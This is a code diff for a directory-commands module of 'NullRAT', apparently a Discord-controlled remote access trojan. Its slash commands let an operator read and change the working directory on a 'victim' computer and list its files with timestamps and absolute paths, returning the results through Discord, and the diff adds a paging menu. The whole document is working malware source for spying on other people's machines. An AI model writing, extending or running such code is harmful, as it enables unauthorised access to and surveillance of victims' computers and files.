@@ -1,38 +1,42 @@
 import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
+from io import BytesIO
 
-import os, requests
+import os, requests, time
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 class DirectoryCommands(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Returns Current Working Directory",
-        options=[bot.victim]
-    )
+    @commands.slash_command( )
     async def get_currentdir(self, ctx, victim):
-        if str(victim) == str(self.ip_addr):
+        """Returns Current Working Directory
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.send_message(
                 embed=self.bot.genEmbed(
                     "Current directory of NullRAT:", 
                     datetime.now(), 
-                    os.getcwd()
+                    f"`{os.getcwd()}`"
                 )
             )
 
-    @commands.slash_command(
-        description="Change directory to specified location",
-        options=[
-            bot.victim,
-            discord.Option("directory", description="New directory where NullRAT will CD", required=True),
-        ]
-    )
-    async def change_directory(self, ctx, victim, directory):
-        if str(victim) == str(self.ip_addr):
+    @commands.slash_command( )
+    async def set_currentdir(self, ctx, victim, directory):
+        """Change directory to specified location
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        directory: Directory where NullRAT will change (cd) to
+        """
+        if str(victim) == str(self.bot.identifier):
             try:
                 os.chdir(directory)
                 return await ctx.response.send_message(
@@ -45,25 +49,172 @@ class DirectoryCommands(commands.Cog):
             except FileNotFoundError:
                 await ctx.response.send_message(embed=self.bot.genEmbed( "Directory not found!", datetime.now() ))
 
-    @commands.slash_command(description="Finds contents of directory")
-    async def list_directory(self, ctx, victim, directory_to_find="null"):
-        if str(victim) == str(self.ip_addr):
-            await ctx.response.defer()
-            if directory_to_find == "null":
-                directory_to_find = os.getcwd()
-                subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            else:
-                try: os.chdir(directory_to_find)
-                except: return await ctx.followup.send(embed=Embed(title="Invalid directory! Please try again :)"))
-                subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-            file = discord.File(
-                os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
+    @commands.slash_command( )
+    async def list_rawdir(self, ctx, victim, directory="null"):
+        """List all directory contents quickly in a raw format
+        
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        directory: Directory whose contents will be listed (optional)
+        """
+        if str(victim) == str(self.bot.identifier):
+            if directory != 'null':
+                try: os.chdir(directory)
+                except FileNotFoundError: return await ctx.response.send_message("Invalid directory!")
+            
+            await ctx.response.send_message(
+                file = discord.File(
+                    BytesIO(
+                        bytes( 
+                            os.popen(f"dir").read(), 'utf-8' 
+                        )
+                    ), 
+                    filename="Directory.txt"
+                )
             )
-            embed=discord.Embed(title="Contents of directory are:", description=directory_to_find)
-            await ctx.followup.send(embed=embed, file=file)
-            os.remove(nr_working + "\\dir.txt")
-            os.chdir(original_dir)
+            
+    @commands.slash_command( )
+    async def list_directory(self, ctx, victim, directory="null"):
+        """Lists contents of directory with advanced information
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        directory: Directory whose contents will be listed (optional)
+        """
+        if str(victim) == str(self.bot.identifier):
+            try:
+                contents = os.listdir( 
+                    os.getcwd() if directory == "null" else directory 
+                )
+            except FileNotFoundError:
+                return await ctx.response.send_message(
+                    embed = self.bot.genEmbed(
+                        "Invalid directory!",
+                        datetime.now()
+                    )
+                )
+            
+            try: os.chdir(directory)
+            except: pass
+            
+            await ctx.response.send_message(
+                embed = self.bot.genEmbed(
+                    "Directory Contents:",
+                    datetime.now()
+                )
+            )
+            
+            embeds = []
+            
+            for c in contents:
+                embed = self.bot.genEmbed(f"**{c}**",datetime.now(),'_ _')
+                    
+                embed.add_field(
+                    name = "Type:", 
+                    value = "Directory" if os.path.isdir(c) else "File", 
+                    inline = False
+                )
+                
+                try:    
+                    embed.add_field(
+                        name = "Created on:", 
+                        value = str(
+                            time.ctime(
+                                os.path.getctime(c)
+                            )
+                        ), inline = False
+                    )
+                    
+                    embed.add_field(
+                        name = "Last modified:", 
+                        value = str(
+                            time.ctime(
+                                os.path.getmtime(c)
+                            )
+                        ), inline = False
+                    )
+                except FileNotFoundError:
+                    pass
+                
+                try:
+                    embed.add_field(
+                        name = "File Size:",
+                        value = "Size",
+                        inline = False
+                    )
+                except:
+                    pass
+                    
+                embed.add_field(
+                    name = "Absolute Path:", 
+                    value = "```" + os.path.abspath(c) + "```", 
+                    inline = False
+                )
+                
+                embeds.append(embed)
+                
+            await ctx.channel.send(embed = embeds[0], view = Menu(embeds))
 
 def setup(bot: commands.Bot):
     bot.add_cog(DirectoryCommands(bot))
+
+class Menu(discord.ui.View):
+    def __init__(self, embeds):
+        super().__init__(timeout=None)
+        self.embeds = embeds
+        self.embed_count = 0
+
+        self.first_page.disabled = True
+        self.prev_page.disabled = True
+
+        for i, embed in enumerate(self.embeds):
+            embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)}")
+
+    @discord.ui.button(label="<< First", style=discord.ButtonStyle.blurple)
+    async def first_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count = 0
+        embed = self.embeds[self.embed_count]
+        embed.set_footer(text=f"Page 1 of {len(self.embeds)}")
+
+        self.first_page.disabled = True
+        self.prev_page.disabled = True
+        self.next_page.disabled = False
+        self.last_page.disabled = False
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="< Previous", style=discord.ButtonStyle.secondary)
+    async def prev_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count -= 1
+        embed = self.embeds[self.embed_count]
+
+        self.next_page.disabled = False
+        self.last_page.disabled = False
+        if self.embed_count == 0:
+            self.first_page.disabled = True
+            self.prev_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="Next >", style=discord.ButtonStyle.secondary)
+    async def next_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count += 1
+        embed = self.embeds[self.embed_count]
+
+        self.first_page.disabled = False
+        self.prev_page.disabled = False
+        if self.embed_count == len(self.embeds) - 1:
+            self.next_page.disabled = True
+            self.last_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="Last >>", style=discord.ButtonStyle.blurple)
+    async def last_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
+        self.embed_count = len(self.embeds) - 1
+        embed = self.embeds[self.embed_count]
+
+        self.first_page.disabled = False
+        self.prev_page.disabled = False
+        self.next_page.disabled = True
+        self.last_page.disabled = True
+        await interaction.response.edit_message(embed=embed, view=self)
